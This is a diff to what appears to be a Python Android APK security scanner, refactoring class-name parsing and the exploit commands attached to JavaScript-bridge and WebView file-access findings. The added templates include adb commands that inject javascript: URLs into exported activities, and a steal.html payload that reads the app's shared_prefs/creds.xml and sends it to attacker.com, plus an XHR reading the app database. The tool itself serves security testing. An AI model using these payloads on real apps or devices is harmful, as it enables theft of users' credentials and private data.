@@ -110,10 +110,14 @@ class IntentToWebViewRule(BaseRule):
         taint_paths = self.taint_engine.get_paths_to_sink("loadUrl")
 
         for path in taint_paths:
-            # Extract real class name from dalvik method signature
-            # e.g. "Lio/pkg/MyActivity;->onCreate(...)V" → "io.pkg.MyActivity"
+            # Extract real class name from dalvik method signature.
+            # Androguard full_name format: "Lcom/pkg/Class; methodName (desc)V"  (space-separated)
+            # Fallback format:             "Lcom/pkg/Class;->methodName(desc)V"  (arrow-separated)
             component = path.sink
-            if '->' in component:
+            if ';' in component:
+                # Space-separated androguard full_name: take everything before the first ';'
+                component = component.split(';')[0].lstrip('L').replace('/', '.')
+            elif '->' in component:
                 component = component.split('->')[0].lstrip('L').rstrip(';').replace('/', '.')
 
             exploit_cmds = [
@@ -449,18 +453,44 @@ class JavaScriptBridgeRule(BaseRule):
             return findings
 
         bridge_methods = self.callgraph.search_methods("addJavascriptInterface")
+        pkg = self.apk_parser.get_package_name()
 
         for method in bridge_methods:
+            # Extract Java class name from signature (supports both -> and space formats)
+            raw = method.split("->")[0] if "->" in method else method.split(";")[0] if ";" in method else method
+            class_name = raw.lstrip("L").rstrip(";").replace("/", ".") or "Application"
+
+            # Look up whether this class is a directly launchable exported activity
+            exported_activities = {a["name"] for a in self.apk_parser.get_activities() if a.get("exported")}
+            launch_target = class_name if class_name in exported_activities else None
+
+            if launch_target:
+                exploit_cmds = [
+                    f"# {class_name} exposes a JavaScript bridge — launch it and inject JS",
+                    f"adb shell am start -n {pkg}/{launch_target} --es url 'javascript:window._native_interface.toString()'",
+                    f"# Enumerate all bridge methods:",
+                    f"adb shell am start -n {pkg}/{launch_target} --es url "
+                    f"'javascript:alert(Object.getOwnPropertyNames(window).filter(k=>typeof window[k]==\"object\").join(\",\"))'",
+                ]
+            else:
+                exploit_cmds = [
+                    f"# {class_name} exposes a JavaScript bridge",
+                    f"# Load a page containing this WebView and inject:",
+                    f"javascript:window._native_interface.toString()",
+                    f"# Or enumerate bridge objects:",
+                    f"javascript:alert(Object.getOwnPropertyNames(window).filter(k=>typeof window[k]==\"object\").join(\",\"))",
+                ]
+
             findings.append(self.create_finding(
-                component_name=method.split("->")[0] if "->" in method else "Application",
+                component_name=class_name,
                 confidence=Confidence.CONFIRMED,
                 details={
                     "issue": "JavaScript bridge exposed",
                     "method": method
                 },
-                code_snippet="webView.addJavascriptInterface(new JsBridge(), \"Android\");",
+                code_snippet='webView.addJavascriptInterface(new JsBridge(), "_native_interface");',
                 remediation="Remove @JavascriptInterface methods or validate origin. Use Chrome Custom Tabs instead.",
-                exploit_commands=["# Inject JavaScript", "javascript:Android.method(args)"]
+                exploit_commands=exploit_cmds,
             ))
 
         return findings
@@ -498,6 +528,7 @@ class WebViewFileAccessRule(BaseRule):
         pkg = self.apk_parser.get_package_name()
 
         # Check both the universal access flag and the weaker file-to-file flag
+        # exploit_cmds are built inside the loop so the actual class_name is used.
         checks = [
             (
                 "setAllowUniversalAccessFromFileURLs",
@@ -505,14 +536,6 @@ class WebViewFileAccessRule(BaseRule):
                 Severity.CRITICAL,
                 "Allows any file:// page to read ALL files the app can access — "
                 "equivalent to a full same-origin policy bypass.",
-                [
-                    "# Load a crafted HTML file that reads app private data",
-                    f"adb shell am start -a android.intent.action.VIEW "
-                    f"-d 'file:///sdcard/steal.html' -n {pkg}/.WebViewActivity",
-                    "# steal.html content:",
-                    "# <script>fetch('file:///data/data/{pkg}/shared_prefs/creds.xml')"
-                    ".then(r=>r.text()).then(d=>location='https://attacker.com/?d='+btoa(d))</script>",
-                ]
             ),
             (
                 "setAllowFileAccessFromFileURLs",
@@ -520,19 +543,11 @@ class WebViewFileAccessRule(BaseRule):
                 Severity.HIGH,
                 "Allows file:// pages to read other file:// URIs — "
                 "an attacker can read any file the app has access to via a crafted local HTML page.",
-                [
-                    "# Load a crafted HTML that reads another local file",
-                    f"adb shell am start -a android.intent.action.VIEW "
-                    f"-d 'file:///sdcard/steal.html' -n {pkg}/.WebViewActivity",
-                    "# steal.html: <script>var x=new XMLHttpRequest();"
-                    "x.open('GET','file:///data/data/{pkg}/databases/app.db',false);"
-                    "x.send();alert(x.responseText)</script>",
-                ]
             ),
         ]
 
         seen: set = set()
-        for api_name, confidence, severity, scenario, exploit_cmds in checks:
+        for api_name, confidence, severity, scenario in checks:
             callers = self.callgraph.search_methods(api_name)
             for caller_sig in callers:
                 if caller_sig in seen:
@@ -547,6 +562,28 @@ class WebViewFileAccessRule(BaseRule):
                     caller_sig.split("->")[0].strip("L").replace("/", ".").rstrip(";")
                     if "->" in caller_sig else caller_sig
                 )
+
+                # Build exploit commands using the actual class name found in the APK
+                if api_name == "setAllowUniversalAccessFromFileURLs":
+                    exploit_cmds = [
+                        "# Push a crafted HTML file that reads app private data",
+                        "adb push steal.html /sdcard/steal.html",
+                        f"adb shell am start -a android.intent.action.VIEW "
+                        f"-d 'file:///sdcard/steal.html' -n {pkg}/{class_name}",
+                        "# steal.html content:",
+                        f"# <script>fetch('file:///data/data/{pkg}/shared_prefs/creds.xml')"
+                        ".then(r=>r.text()).then(d=>location='https://attacker.com/?d='+btoa(d))</script>",
+                    ]
+                else:
+                    exploit_cmds = [
+                        "# Push a crafted HTML that reads another local file",
+                        "adb push steal.html /sdcard/steal.html",
+                        f"adb shell am start -a android.intent.action.VIEW "
+                        f"-d 'file:///sdcard/steal.html' -n {pkg}/{class_name}",
+                        "# steal.html: <script>var x=new XMLHttpRequest();"
+                        f"x.open('GET','file:///data/data/{pkg}/databases/app.db',false);"
+                        "x.send();alert(x.responseText)</script>",
+                    ]
 
                 # Override severity per-finding since the two APIs have different severities
                 original_severity = self.severity
